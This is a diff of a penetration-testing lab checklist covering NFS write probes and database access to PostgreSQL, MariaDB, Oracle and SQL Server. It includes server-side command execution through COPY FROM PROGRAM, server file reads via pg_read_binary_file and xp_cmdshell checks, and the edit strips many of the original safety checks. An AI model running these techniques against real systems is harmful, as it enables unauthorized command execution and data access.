-| Mount denied | Retain the exact client/export denial; **NET-05**. Do not change identity to force access. |
-| Mount version/path/security mismatch | **NFS-01**, using recorded RPC/path evidence. Kerberos-required exports need a supplied authorized context; do not downgrade security or guess versions. |
-| Directory/file permission denied | Record which operation failed and your `id`; **NET-05**. A known permitted root-level file can still be checked when listing alone was denied. |
-| No relevant file in this listing | **NET-05**; record this inspection extent, not “NFS contains nothing.” |
-| Read stalls/server disappears | Stop inspection; follow the recovery notes below and **PAUSE-RECOVERY** if cleanup cannot be confirmed. |
-
-Cleanup applies after success, denial or a failed mount. Leave the export first.
-This one block checks the exact source and NFS filesystem type before unmounting.
-If nothing mounted, it removes only the empty local directory. Replace every
-value inside the block; a mismatch or failed unmount stops before `rmdir`:
-
-```bash
-(
-  local_point='/tmp/owb-nfs-<same-run-id>'
-  expected_source='<authorized-target-ipv4>:<exact-export-path>'
-  if test -L "$local_point" || ! test -d "$local_point"; then
-    printf 'Mountpoint changed or absent; stop cleanup\n' >&2; exit 1
-  fi
-  if mountpoint -q --nofollow -- "$local_point"; then
-    mounted_source=$(findmnt -n -r -o SOURCE --mountpoint "$local_point") || exit 1
-    mounted_type=$(findmnt -n -r -o FSTYPE --mountpoint "$local_point") || exit 1
-    if test "$mounted_source" != "$expected_source" ||
-       { test "$mounted_type" != nfs && test "$mounted_type" != nfs4; }; then
-      printf 'Mount source/type changed; stop cleanup\n' >&2; exit 1
-    fi
-    sudo umount -- "$local_point" || exit 1
-  fi
-  if mountpoint -q --nofollow -- "$local_point"; then
-    printf 'Mount still present; stop cleanup\n' >&2; exit 1
-  fi
-  rmdir -- "$local_point"
-)
-```
-
-Confirm `rmdir` succeeded. If still mounted, busy, or removal failed:
-**PAUSE-RECOVERY**. Do not delete mounted content or silently create a replacement.
+| File readable | **NET-05** for its matching service. |
+| Mount denied | **NET-05**. |
+| Permission denied | **NET-05**; keep your `id`. |
+| Stalled or unmount failed | **PAUSE-RECOVERY**. |
 
 ## NFS-03 — Can this explicitly permitted identity write one inert file and remove it?
 
-Enter only when the exercise explicitly permits a write test on the exact export.
-Start from NFS-02's verified export context, mounting without `ro` only for this check.
-Do not use a share containing production-like data, run a recursive search, or
-replace an existing file.
-
-Choose a fresh mountpoint and a fresh simple ASCII probe filename, such as
-`OWB_NFS_20260928_01.txt`. Repeat the same values in every step. Stop if the
-mountpoint or probe name already exists:
+Enter only when a write test is permitted.
 
 ```bash
-mkdir -m 700 -- '/tmp/owb-nfs-write-<unique-run-id>'
+mkdir -m 700 -- '/tmp/owb-nfs-w'
+sudo mount -t nfs -o 'rw,nosuid,nodev,noexec,vers=<VERSION>,proto=tcp,port=<PORT>' '<TARGET_IP>:<EXPORT>' '/tmp/owb-nfs-w'
+( set -C; printf 'probe\n' > '/tmp/owb-nfs-w/probe-<ID>.txt' )
+cat -- '/tmp/owb-nfs-w/probe-<ID>.txt'
+rm -i -- '/tmp/owb-nfs-w/probe-<ID>.txt'
+sudo umount -- '/tmp/owb-nfs-w' && rmdir -- '/tmp/owb-nfs-w'
 ```
 
-```bash
-sudo mount -t nfs -o 'rw,nosuid,nodev,noexec,fg,retry=0,vers=<observed-version>,proto=tcp,port=<observed-nfs-port>' '<authorized-target-ipv4>:<exact-export-path>' '/tmp/owb-nfs-write-<same-run-id>'
-```
-
-Verify this exact source and `rw` mount before writing:
-
-```bash
-findmnt --mountpoint '/tmp/owb-nfs-write-<same-run-id>' -o TARGET,SOURCE,FSTYPE,OPTIONS
-id
-```
-
-Create one inert file without overwriting an existing name, then read it back:
-
-```bash
-( set -C; printf 'workbench inert probe\n' > '/tmp/owb-nfs-write-<same-run-id>/<unique-probe-name>.txt' )
-```
-
-```bash
-stat -- '/tmp/owb-nfs-write-<same-run-id>/<same-probe-name>.txt'
-cat -- '/tmp/owb-nfs-write-<same-run-id>/<same-probe-name>.txt'
-```
-
-Only if creation succeeded and the readback contains your exact inert marker,
-remove that same probe. If creation failed because a name already existed, do
-not delete that file. Confirm absence before unmounting the exact export:
-
-```bash
-rm -i -- '/tmp/owb-nfs-write-<same-run-id>/<same-probe-name>.txt'
-test ! -e '/tmp/owb-nfs-write-<same-run-id>/<same-probe-name>.txt' && echo 'probe removed'
-```
-
-Use the same guarded cleanup after a successful probe removal, a denied write
-or a failed mount. Do not hide an unremoved probe by unmounting first. Stop if
-the source/type changed, unmount fails or the local directory is not empty:
-
-```bash
-(
-  local_point='/tmp/owb-nfs-write-<same-run-id>'
-  expected_source='<authorized-target-ipv4>:<exact-export-path>'
-  if test -L "$local_point" || ! test -d "$local_point"; then
-    printf 'Mountpoint changed or absent; stop cleanup\n' >&2; exit 1
-  fi
-  if mountpoint -q --nofollow -- "$local_point"; then
-    mounted_source=$(findmnt -n -r -o SOURCE --mountpoint "$local_point") || exit 1
-    mounted_type=$(findmnt -n -r -o FSTYPE --mountpoint "$local_point") || exit 1
-    if test "$mounted_source" != "$expected_source" ||
-       { test "$mounted_type" != nfs && test "$mounted_type" != nfs4; }; then
-      printf 'Mount source/type changed; stop cleanup\n' >&2; exit 1
-    fi
-    sudo umount -- "$local_point" || exit 1
-  fi
-  if mountpoint -q --nofollow -- "$local_point"; then
-    printf 'Mount still present; stop cleanup\n' >&2; exit 1
-  fi
-  rmdir -- "$local_point"
-)
-```
-
-| Result | Next action |
+| Result | Next |
 | --- | --- |
-| Probe created, read back and removed; owner/group recorded | Record the current client identity, reported owner/group and export options; **NET-05**. A non-root write does not prove root access or disprove root-squash. |
-| Write denied or export is read-only | Record the exact operation and mount options; **NET-05**. Do not remount repeatedly or change identity. |
-| Probe exists but removal fails | Stop, preserve the exact path and use **PAUSE-RECOVERY**; never hide an unclean export. |
-| Owner/group differs from the client identity | Record identity mapping as a clue only; **GAP-ACCESS** until a separately authorized root-mapping test is defined. |
-| Mount, server or transport fails | Return to **NFS-01/NFS-02** and preserve the failure stage. |
-
-This procedure does not perform a root-client write test. Root-squash behavior is
-only established by an explicitly authorized, separately reviewed root-context
-trial; ordinary-user ownership is not enough.
+| Created, read back and removed | **NET-05**. |
+| Write denied | **NET-05**. |
+| Probe remains | **PAUSE-RECOVERY**. |
+| Owner differs from your `id` | **GAP-ACCESS**. |
 
 # snmp
 
@@ -3712,2739 +1582,693 @@ Delete the dump when done if you no longer need it:
 rm -i snmp.txt
 ```
 
-
 # database
 
-Use Kali Bash for connection commands and the connected database client's prompt
-for SQL. Replace `<...>` values. Use one supplied or explicitly permitted identity
-for its matching endpoint. Do not guess accounts or send the same credential to
-unrelated services. Never paste a password into the examples or shell arguments.
+Confirm the engine from its response before picking a client. One supplied identity per endpoint.
 
 ## DB-01. Can the assigned identity establish a database session?
 
-First confirm the engine from its observed response, not only its port. Use the
-matching client and replace the endpoint and supplied account in that command.
-Choose the connection matching the lab's transport context, not all four examples.
-Certificate files are needed only for the verified-TLS choices. A certificate
-error is not permission to switch to plaintext.
-
-For an explicitly assigned non-TLS endpoint on the isolated lab transport:
-
-PostgreSQL:
+Non-TLS lab only:
 
 ```bash
-PGHOSTADDR='<authorized-target-ip>' PGSSLMODE=disable PGCONNECT_TIMEOUT=5 \
-  psql -X -W --host '<authorized-target-ip>' --port '<observed-database-port>' \
-  --username '<supplied-database-user>' --dbname '<supplied-or-observed-database>'
+PGHOSTADDR='<TARGET_IP>' PGSSLMODE=disable PGCONNECT_TIMEOUT=5 psql -X -W --host '<TARGET_IP>' --port '<PORT>' --username '<USER>' --dbname '<DB>'
+mariadb --no-defaults --protocol=tcp --connect-timeout=5 --host='<TARGET_IP>' --port='<PORT>' --user='<USER>' --password --disable-ssl
 ```
 
-MariaDB client:
+For verified TLS use `PGSSLMODE=verify-full PGSSLROOTCERT='<CA>'` and the certificate hostname, or `--ssl --ssl-ca='<CA>' --ssl-verify-server-cert`. Do not fall back to plaintext after a trust failure.
 
-```bash
-mariadb --no-defaults --protocol=tcp --connect-timeout=5 \
-  --host='<authorized-target-ip>' --port='<observed-database-port>' --user='<supplied-database-user>' \
-  --password --disable-ssl
-```
-
-These choices transmit without TLS. Use them only for the assigned non-TLS lab
-context, not as fallback after a trust failure. If transport requirements are
-unknown, resolve that question at **PAUSE-ROUTE** before sending credentials.
-
-For a verified-TLS endpoint with assigned hostname and CA:
-
-PostgreSQL, with the assigned hostname and address kept separate:
-
-```bash
-PGHOSTADDR='<authorized-target-ip>' PGSSLMODE=verify-full PGSSLROOTCERT='<absolute-path-to-assigned-lab-ca-file>' PGCONNECT_TIMEOUT=5 \
-  psql -X -W --host '<assigned-database-certificate-hostname>' --port '<observed-database-port>' \
-  --username '<supplied-database-user>' --dbname '<supplied-or-observed-database>'
-```
-
-MariaDB client, against an observed MariaDB/MySQL-compatible service:
-
-```bash
-mariadb --no-defaults --protocol=tcp --connect-timeout=5 \
-  --host='<assigned-database-certificate-hostname>' --port='<observed-database-port>' --user='<supplied-database-user>' \
-  --password --ssl --ssl-ca='<absolute-path-to-assigned-lab-ca-file>' --ssl-verify-server-cert
-```
-
-Enter the supplied password only at the client prompt. The MariaDB hostname must
-resolve to the assigned IP. If it does not, resolve the assigned naming context at
-**DNS-01** before authentication. Do not substitute an IP that fails hostname
-verification and then turn verification off to compensate.
-
-| Result | Next action |
+| Result | Next |
 | --- | --- |
-| Client reaches its SQL prompt | **DB-02**, verify role/database/server before reading metadata. |
-| Password/account denied | Record the supplied identity and error stage; **NET-05**. No automatic retries with other accounts. |
-| Certificate/hostname/CA failure | **PAUSE-ROUTE**, correct the assigned hostname or trust material. This is not a credential verdict. |
-| DNS/connection refused/timeout | `ip route get '<authorized-target-ip>'`; wrong route goes to **PAUSE-ROUTE**, correct route to **NET-03** for the observed endpoint. |
-| Database missing or access to supplied database denied | Record authentication versus database selection separately. Confirm the assigned database; do not guess `postgres`, `root` or unrelated database names. |
-| No identity or unknown engine | **NET-05** for another observed lead, or **NET-03** to clarify protocol. No authentication attempt is needed. |
-| Client option unavailable | Read `psql --help` or `mariadb --help`; use the matching installed client. Do not silently use MySQL-specific options in MariaDB or vice versa. |
-
-After a successful connection, use DB-02's connection/identity check. Confirm the
-selected transport there; a SQL prompt alone does not prove TLS or host identity.
-At the PostgreSQL prompt use `\q`, or at the MariaDB prompt use `quit;`, when
-leaving this branch. These connection commands create no checklist-managed files.
+| SQL prompt | **DB-02**. |
+| Password or account denied | **NET-05**. |
+| Certificate or hostname failure | **PAUSE-ROUTE**. |
+| Refused, timeout or DNS failure | **NET-03** or **PAUSE-ROUTE**. |
 
 ## DB-02. What can this role inspect that changes the next question?
 
-At a PostgreSQL prompt, run:
+PostgreSQL:
 
 ```sql
-SELECT current_user, session_user, current_database(),
-       inet_server_addr(), inet_server_port();
-```
-
-If the observed application names a schema or the current database needs
-triage, list visible schemas:
-
-```sql
-SELECT schema_name FROM information_schema.schemata
-ORDER BY schema_name LIMIT 30;
-```
-
-Use PostgreSQL client commands to clarify the connection only if the server
-address or TLS context is uncertain:
-
-```text
-\conninfo
-```
-
-For one relevant observed schema, inspect visible table metadata. Inspect
-columns only after one table matters to the next question:
-
-```sql
-SELECT table_name, table_type FROM information_schema.tables
-WHERE table_schema = '<observed_schema>' ORDER BY table_name LIMIT 30;
-```
-
-```sql
-SELECT table_name, column_name, data_type FROM information_schema.columns
-WHERE table_schema = '<observed_schema>'
-ORDER BY table_name, ordinal_position LIMIT 100;
-```
-
-At a MariaDB/MySQL-compatible prompt, instead run:
-
-```sql
-SELECT USER(), CURRENT_USER(), DATABASE(), @@hostname, @@port, VERSION();
-```
-
-Only if the current account's rights affect the next action, inspect grants.
-Check the TLS cipher only when transport confirmation is unresolved:
-
-```sql
-SHOW GRANTS;
-```
-
-```sql
-SHOW SESSION STATUS LIKE 'Ssl_cipher';
-```
-
-If no relevant database is already observed, list visible databases:
-
-```sql
-SHOW DATABASES;
-```
-
-Choose one relevant observed database, then inspect its metadata. Replace the backtick-
-quoted database/table identifiers with exactly observed names. For names containing
-backticks, use the client's documented identifier quoting rather than guessing:
-
-```sql
-SHOW FULL TABLES FROM `observed_database`;
-```
-
-```sql
-SHOW COLUMNS FROM `observed_table` FROM `observed_database`;
-```
-
-| Result | Next action |
-| --- | --- |
-| Attributable role and relevant application metadata | Record role, endpoint/database and the exact relationship; **NET-05** for the corresponding observed application/service. A matching database name alone is not proof of a relationship. |
-| A specific role/grant suggests a higher capability | PostgreSQL program rights use **DB-07**; an already evidenced server-file right and relevant exact path use **DB-08**. Other capabilities remain **GAP-ACCESS**. Do not enable execution functions or change privileges to fill this task. |
-| Metadata/table permission denied | Retain operation-specific denial; use other permitted metadata or **NET-05**. Do not call authentication failed. |
-| No useful relationship in visible metadata | **NET-05**, recording the inspected schemas/tables and limits. Metadata visibility is not a full data audit. |
-| Server identity differs from assignment | **PAUSE-ROUTE**. Keep the reported hostname and connection address separate; a proxy/backend name can differ and needs clarification. |
-| Connection/role changed or session lost | **DB-01** before interpreting new access. Do not merge results from distinct roles. |
-
-Close using the correct client command. PostgreSQL:
-
-```text
-\q
+SELECT current_user, session_user, current_database(), inet_server_addr(), inet_server_port();
+SELECT table_name FROM information_schema.tables WHERE table_schema='<SCHEMA>' LIMIT 30;
 ```
 
 MariaDB:
 
 ```sql
-quit;
+SELECT USER(), CURRENT_USER(), DATABASE(), @@hostname, VERSION();
+SHOW DATABASES;
+SHOW COLUMNS FROM `table` FROM `database`;
 ```
 
-No records or server settings should have changed in these decisions. If you ran
-additional write statements, verify their exact transaction/state and cleanup
-separately; neither disconnect nor a success banner proves rollback.
+Check `SHOW GRANTS` or `Ssl_cipher` only when the next decision needs them.
+
+| Result | Next |
+| --- | --- |
+| Relevant schema or rights | **NET-05** for the matching application. |
+| PostgreSQL program or server-file right | **DB-07** / **DB-08**. |
+| Permission denied | **NET-05**. |
+| Server identity differs | **PAUSE-ROUTE**. |
+
+The question set follows the [source checklist](../references/checklist.md).
 
 ## DB-06. Can the supplied Oracle identity read bounded metadata without OS access?
 
-Enter only after NET-03 identifies Oracle and the assigned service name, listener
-address, port and TLS/wallet context are known. Use the installed `oracledb`
-Python driver only with the observed transport. This branch checks session
-identity, with optional owned-object metadata. It does not invoke `UTL_FILE`, Java, external jobs,
-`DBMS_SCHEDULER` or any OS command.
-
-The assigned hostname must resolve to the authorized endpoint. This one block
-prompts for all connection values and performs the bounded read. Select `tcps`
-only with the assigned wallet directory; select `plain-lab` only when the
-exercise explicitly specifies plaintext transport:
+Enter with a verified Oracle listener and assigned service/wallet context.
 
 ```bash
 python3 - <<'PY'
-import getpass
-import oracledb
-import sys
-
+import getpass, oracledb, sys
 sys.stdin = open('/dev/tty', 'r', encoding='utf-8')
-host = input('Assigned Oracle hostname: ').strip()
-port = int(input('Observed listener port: '))
-service = input('Observed service name: ').strip()
-user = input('Supplied Oracle user: ').strip()
-mode = input('Observed transport [tcps/plain-lab]: ').strip()
-if mode not in {'tcps', 'plain-lab'}:
-    raise SystemExit('Use only the observed transport mode')
-wallet = None
-if mode == 'tcps':
-    wallet = input('Absolute assigned wallet directory: ').strip()
-    if not wallet:
-        raise SystemExit('TCPS requires the assigned wallet; no plaintext fallback')
-connection = None
+host = input('Hostname: ').strip(); port = int(input('Port: '))
+service = input('Service: ').strip(); user = input('User: ').strip()
+mode = input('Transport [tcps/plain-lab]: ').strip()
+wallet = input('Wallet dir (tcps): ').strip() or None
+con = oracledb.connect(user=user, password=getpass.getpass('Password: '), host=host, port=port,
+  service_name=service, protocol='tcps' if mode == 'tcps' else 'tcp', wallet_location=wallet,
+  ssl_server_dn_match=True, tcp_connect_timeout=5)
 try:
-    connection = oracledb.connect(
-        user=user, password=getpass.getpass('Supplied password: '),
-        host=host, port=port, service_name=service,
-        protocol='tcps' if mode == 'tcps' else 'tcp',
-        wallet_location=wallet, ssl_server_dn_match=True,
-        tcp_connect_timeout=5,
-    )
-    with connection.cursor() as cursor:
-        cursor.execute("SELECT SYS_CONTEXT('USERENV','SESSION_USER'), SYS_CONTEXT('USERENV','CURRENT_SCHEMA'), SYS_CONTEXT('USERENV','DB_NAME') FROM dual")
-        print('Session identity:', list(cursor))
-        if input('List up to 30 owned objects? [yes/no] ') == 'yes':
-            cursor.execute("SELECT owner, object_type, object_name FROM user_objects FETCH FIRST 30 ROWS ONLY")
-            print('Owned objects:', list(cursor))
+    with con.cursor() as c:
+        c.execute("SELECT SYS_CONTEXT('USERENV','SESSION_USER'), SYS_CONTEXT('USERENV','DB_NAME') FROM dual")
+        print(list(c))
+        c.execute('SELECT owner, object_type, object_name FROM user_objects FETCH FIRST 30 ROWS ONLY')
+        print(list(c))
 finally:
-    if connection is not None:
-        connection.close()
+    con.close()
 PY
 ```
 
-The wallet is an input boundary for the assigned environment; do not print its
-contents or copy it into evidence. Route the result as follows:
-
-| Result | Next action |
+| Result | Next |
 | --- | --- |
-| Oracle identity/service and bounded metadata return | Record exact service, user/schema and query extent; **NET-05** for the observed application relationship. **No OS command** or host privilege is implied. |
-| Login denied or service name rejected | Preserve authentication versus listener/service-name stage; **NET-05**. No account guessing. |
-| TLS/wallet/hostname failure | **PAUSE-ROUTE** and correct assigned trust material; do not disable verification. |
-| Metadata permission denied or empty | Record operation-specific visibility; **NET-05**. Do not call the database empty or the account invalid. |
-| Query, client or transport unavailable | **PAUSE-COVERAGE** with the exact missing prerequisite; do not substitute a different engine client. |
-
-Close the connection and remove only private local logs created for this check.
-No Oracle configuration, rows, jobs or external files should change.
+| Identity and metadata returned | **NET-05**. |
+| Login or service rejected | **NET-05**. |
+| TLS or wallet failure | **PAUSE-ROUTE**. |
+| Query unavailable | **PAUSE-COVERAGE**. |
 
 ## DB-07. Can this PostgreSQL role run a fixed server-side identity command?
 
-Enter from **DB-02** with an attributed PostgreSQL 11+ server, current role and
-assigned Linux context. Use a separate DB-01 psql connection with no unrelated
-transaction or work. This is a selected OS-command proof, not an interactive
-shell. Windows and unverified SQL-injection carriers need their own procedure.
-
-At the **psql prompt**, check active role and available rights:
-
 ```sql
-SELECT current_user, session_user, current_database(), version();
-SELECT rolsuper,
-       pg_has_role(current_user, 'pg_execute_server_program', 'USAGE') AS program_rights,
-       has_database_privilege(current_user, current_database(), 'TEMP') AS temp_rights
-FROM pg_roles WHERE rolname = current_user;
-```
-
-Require `rolsuper = true` or `program_rights = true`, plus temporary table
-permission. False/denied/unknown rights return to **DB-02/NET-05**. Do not grant
-roles or use SET ROLE to manufacture the prerequisite. Require the observed
-server's existing `/usr/bin/id`; missing executable is not a privilege verdict.
-
-Choose a fresh lowercase table name using letters/digits/underscores. Check
-absence in this session and repeat exactly that name in all statements:
-
-```sql
-SELECT to_regclass('pg_temp.<unique_proof_table>') AS existing_object;
-```
-
-If a relation is returned, stop and choose another name. Never drop an existing
-object. With an absent name and a clean dedicated connection, run:
-
-```sql
+SELECT rolsuper, pg_has_role(current_user,'pg_execute_server_program','USAGE') FROM pg_roles WHERE rolname=current_user;
 BEGIN;
-SET LOCAL statement_timeout = '10s';
-CREATE TEMP TABLE "<unique_proof_table>" (line text) ON COMMIT DROP;
-COPY pg_temp."<unique_proof_table>" FROM PROGRAM '/usr/bin/id';
-SELECT line FROM pg_temp."<unique_proof_table>";
+CREATE TEMP TABLE "proof_<ID>" (line text) ON COMMIT DROP;
+COPY pg_temp."proof_<ID>" FROM PROGRAM '/usr/bin/id';
+SELECT line FROM pg_temp."proof_<ID>";
 ROLLBACK;
-SELECT to_regclass('pg_temp.<unique_proof_table>') AS remaining_object;
 ```
 
-Read and retain output before rollback. After any error or interrupt, run
-`ROLLBACK;` at this dedicated prompt, then the final `to_regclass` check.
-An error can leave an aborted transaction; do not abandon it as clean state.
-
-| Result | Next choice |
+| Result | Next |
 | --- | --- |
-| Actual uid/gid output, rollback acknowledged and proof table absent | private adventure evidence records execution as the database OS account. **EXP-01** selects a separately reviewed access method if a shell is needed. This is not host-root or objective proof by itself. |
-| Role/COPY permission denied | **DB-02/NET-05** for another permitted lead; authentication and OS execution are separate. |
-| Missing/denied program, nonzero exit, timeout or no attributable output | Roll back and check absence; **PAUSE-COVERAGE** for the exact runtime boundary. No automatic repeat. |
-| Output conflicts with assigned server/context | **PAUSE-ROUTE**. SQL and OS account names need not match. |
-| Rollback/absence unconfirmed, connection lost or server unhealthy | **PAUSE-RECOVERY**, retaining exact session/table and known lab recovery. No guessed global DROP or backend kills. |
-
-Exit this dedicated connection with `\q` when finished. No target payload file,
-listener or job is created; the temporary SQL object must be confirmed absent.
-Rollback does not undo arbitrary external command effects, so do not replace
-`/usr/bin/id` with a mutation or payload under this cleanup promise.
+| uid/gid output, rolled back | **EXP-01** if a shell is needed. |
+| Permission denied | **DB-02** / **NET-05**. |
+| No output or timeout | **PAUSE-COVERAGE**. |
+| Rollback unconfirmed | **PAUSE-RECOVERY**. |
 
 ## DB-08. Can the PostgreSQL account read one relevant server file?
 
-Enter from **DB-02** with an attributed PostgreSQL 12+ connection, one existing
-read privilege and an exact relevant server-side path from observed configuration
-or the assignment. No path guessing, directory sweep or whole-file dump. Older
-versions and unverified injection carriers need their own matched procedure.
-
-At the **psql prompt**, check the current account and this function's exact rights:
-
 ```sql
-SELECT current_user, current_database();
-SELECT rolsuper,
-       pg_has_role(current_user, 'pg_read_server_files', 'USAGE') AS server_file_rights,
-       has_function_privilege(current_user,
-         'pg_catalog.pg_read_binary_file(text,bigint,bigint,boolean)', 'EXECUTE') AS function_rights
-FROM pg_roles WHERE rolname = current_user;
+SELECT pg_catalog.pg_read_binary_file('<FILE>', 0, 4096, true)::text;
 ```
 
-Require superuser, or available server-file rights plus function EXECUTE. Missing
-or denied rights return to **DB-02/NET-05**. Do not GRANT or SET ROLE to fill this
-step. Database ownership alone is not this prerequisite.
+Or decode the hex locally: `printf '%s' '<HEX>' | xxd -r -p | head -c 4096 | cat -v`.
 
-Replace the path directly. For a single quote in the path, double it as SQL `''`;
-do not substitute an unescaped path into the literal. Read only the first 4096 bytes:
-
-```sql
-WITH sample AS MATERIALIZED (
-  SELECT pg_catalog.pg_read_binary_file('<exact-observed-server-file>', 0, 4096, true) AS bytes
-)
-SELECT bytes IS NULL AS missing,
-       octet_length(bytes) AS bytes_read,
-       encode(bytes, 'hex') AS hex_content
-FROM sample;
-```
-
-For readable content, copy only the returned hexadecimal value. In **Kali Bash**,
-decode it without creating another file, and display control characters visibly:
-
-```bash
-printf '%s' '<returned-hex-content>' | xxd -r -p | head -c 4096 | cat -v
-```
-
-| Result | Next choice |
+| Result | Next |
 | --- | --- |
-| `missing = false`, bytes returned and a relevant application/account clue appears | private adventure evidence retains exact path, account, offset/extent and observation; continue at the matching application/service decision. A value is not verified credential use. |
-| `missing = false`, `bytes_read = 0` | This read returned no bytes at offset zero. **DB-02/NET-05** for another observed lead; it is not a missing-file result. |
-| `missing = true` | The selected path was not found by this server read. **PAUSE-COVERAGE** checks the recorded path/context, not another guessed filename. |
-| Permission denied or function unavailable | Keep function/file/OS permission stages separate; **DB-02/NET-05**. SQL authentication is still a separate result. |
-| Exactly 4096 bytes or incomplete/unstable output | Treat the result as bounded/possibly partial. **PAUSE-COVERAGE** names any specific unresolved question; do not automatically dump the remainder. |
-| Different server/account context or connection lost | **DB-01/PAUSE-ROUTE** before further reads. |
-
-No payload file, SQL object, listener or setting was created or changed. Retain
-needed output only in protected adventure evidence, clear unneeded copied secret
-material through your normal local custody workflow, and use `\q` when finished
-with this database session. Do not delete the server source file as cleanup.
+| Relevant content | Matching application or service task. |
+| Missing file | **PAUSE-COVERAGE**. |
+| Permission denied | **NET-05**. |
 
 # mssql
 
-Use **Kali Bash** for the client and its connected **SQL prompt** for T-SQL.
-Replace values and use one permitted identity for the assigned endpoint. AD-20's
-existing exact-ticket connection can enter DB-04 directly; this module does not
-replace or broaden that ticket procedure. SQL authentication below is a different
-assigned access context. No password belongs in a CLI argument or this checklist.
-
 ## DB-03. Can the assigned SQL login connect to this verified SQL Server?
 
-Use the Microsoft **ODBC sqlcmd** variant that supports `-Nm`, with its matching
-driver and assigned lab CA already trusted. The selected hostname must resolve
-to the authorized endpoint and match the certificate. Then connect:
-
 ```bash
-sqlcmd -S 'tcp:<assigned-SQL-certificate-hostname>,<observed-TCP-port>' -U '<one-permitted-SQL-login>' -d '<assigned-or-observed-database>' \
-  -Nm -X1 -x -l 5 -t 20
+sqlcmd -S 'tcp:<SQL_HOST>,<PORT>' -U '<LOGIN>' -d '<DB>' -Nm -X1 -x -l 5 -t 20
 ```
-
-Enter the supplied password only at the client prompt. `-Nm` requires encryption;
-do not add `-C`, use optional encryption or disable TLS to evade a failed trust
-check. `-X1` excludes startup/environment/local shell-command behavior; `-x`
-disables variable substitution. An unexpected noninteractive password source or
-different identity stops the attempt. Use the exact installed client's documented
-prompt behavior, not an automatic second authentication attempt.
 
 | Result | Next |
 | --- | --- |
-| SQL prompt reached | **DB-04**, verify server, original/current login and database. A prompt is not an OS shell. |
-| TLS/CA/hostname error | **PAUSE-ROUTE** for assigned trust/naming. No credential verdict or bypass. |
-| Account rejected or database unavailable | Record the exact stage and one supplied identity; **NET-05/PAUSE-COVERAGE**. No username/password guessing or cross-service retry. |
-| Refused/timeout/DNS or unexpected address | **NET-03/DNS-01/PAUSE-ROUTE** as appropriate; inspect the actual route/address before more contact. |
-| Unsupported client/driver/options | Stop this client path and resolve installation/version locally. No undocumented Go/ODBC substitution. |
-
-If the client option is unavailable, inspect `sqlcmd '-?'` locally. If the
-hostname resolves unexpectedly, use
-`getent ahostsv4 '<assigned-SQL-certificate-hostname>'` before authenticating.
-Check `ip route get '<authorized-endpoint-ip>'` only after a route failure.
-Do not use a different sqlcmd variant or address to bypass certificate trust.
-
-Exit using `QUIT` on a line by itself. No server state or files were changed by
-connection alone. A lab that has no usable certificate requires its own explicit
-transport exception and client procedure; this decision does not provide one.
+| SQL prompt | **DB-04**. |
+| TLS or hostname error | **PAUSE-ROUTE**. |
+| Login rejected | **NET-05**. |
 
 ## DB-04. What can this SQL identity read or execute on this server?
 
-Enter with an attributed connection from DB-03 or the preserved AD-20 connection.
-Run each SQL statement separately. In sqlcmd, enter `GO` on its own line after
-each statement to send the batch. In Impacket's MSSQL prompt, send the statement
-directly; `GO` is not T-SQL and must not be sent as a query.
+Send each statement separately; `GO` in sqlcmd, nothing extra in Impacket.
 
 ```sql
-SELECT ORIGINAL_LOGIN() AS original_login, SUSER_SNAME() AS current_login,
-       USER_NAME() AS database_user, DB_NAME() AS database_name,
-       CAST(SERVERPROPERTY('ServerName') AS nvarchar(128)) AS server_name;
-```
-
-If one application/database relationship needs checking, list only visible
-databases or tables for that question:
-
-```sql
-SELECT TOP (30) name FROM sys.databases ORDER BY name;
-```
-
-```sql
-SELECT TOP (30) TABLE_SCHEMA, TABLE_NAME, TABLE_TYPE
-FROM INFORMATION_SCHEMA.TABLES ORDER BY TABLE_SCHEMA, TABLE_NAME;
-```
-
-Only if a specific rights question remains, inspect current-role permission
-and tokens:
-
-```sql
-SELECT IS_SRVROLEMEMBER('sysadmin') AS is_sysadmin,
-       HAS_PERMS_BY_NAME(NULL, NULL, 'CONTROL SERVER') AS control_server;
-SELECT TOP (30) name, type, usage FROM sys.login_token ORDER BY name;
-SELECT TOP (30) permission_name FROM sys.fn_my_permissions(NULL, 'SERVER')
-ORDER BY permission_name;
-```
-
-Record the selected database and visible extent. These rows can be filtered by
-rights or cut off at 30; absence is not a global negative. For one observed simple
-schema/table name, inspect columns without reading all rows:
-
-```sql
-SELECT TOP (100) COLUMN_NAME, DATA_TYPE, IS_NULLABLE
-FROM INFORMATION_SCHEMA.COLUMNS
-WHERE TABLE_SCHEMA=N'<observed-schema>' AND TABLE_NAME=N'<observed-table>'
-ORDER BY ORDINAL_POSITION;
-```
-
-The 100-column bound leaves larger tables partial. Only substitute observed names.
-Embedded quotes need SQL literal escaping;
-do not blindly interpolate unusual names. Select one relevant relationship or
-one separately authorized row question, not a bulk database dump.
-
-For the exact OS-execution question, switch to `master` only when permitted:
-
-```sql
+SELECT ORIGINAL_LOGIN(), SUSER_SNAME(), USER_NAME(), DB_NAME();
+SELECT IS_SRVROLEMEMBER('sysadmin'), HAS_PERMS_BY_NAME(NULL,NULL,'CONTROL SERVER');
+SELECT name FROM sys.databases ORDER BY name;
+SELECT TABLE_SCHEMA, TABLE_NAME FROM INFORMATION_SCHEMA.TABLES;
 USE master;
-SELECT DB_NAME() AS database_name, USER_NAME() AS database_user;
-SELECT name, value, value_in_use FROM sys.configurations
-WHERE name IN ('show advanced options', 'xp_cmdshell');
-SELECT HAS_PERMS_BY_NAME('sys.xp_cmdshell', 'OBJECT', 'EXECUTE') AS can_execute;
+SELECT name, value, value_in_use FROM sys.configurations WHERE name IN ('show advanced options','xp_cmdshell');
 ```
-
-Confirm master actually became current before interpreting its object permission.
-`1`, `0` and `NULL` are different results. Configuration visibility, execute
-permission and proxy-account availability are different prerequisites.
 
 | Result | Next |
 | --- | --- |
-| Relevant schema/columns or rights supported | private adventure evidence retains role, server, database and extent; **NET-05** or the changed-context check selects the corresponding application or changed-rights question. |
-| xp_cmdshell enabled and execute permission supported | **DB-05** for one native identity proof, still not an interactive shell. A non-sysadmin also needs its existing configured proxy. |
-| xp_cmdshell disabled, confirmed sysadmin and separately permitted isolated-lab change | **DB-05** only after its original-state and recovery checks. No automatic enabling from a broad role label. |
-| Authentication only; metadata/operation denied or proxy/configuration unresolved | Keep successful SQL authentication and exact denied/unknown capability. **PAUSE-COVERAGE/NET-05** chooses a specific missing fact or another lead. |
-| IMPERSONATE, linked-server or SQL Agent permission observed | Preserve the exact principal/object/direction; its concrete transition procedure is still required. Do not enable OS execution to substitute for it. |
-| Identity/server differs, session lost or NULL permission result | **PAUSE-ROUTE/DB-03/PAUSE-COVERAGE**. Do not merge results across original/current roles or infer denial from NULL. |
-
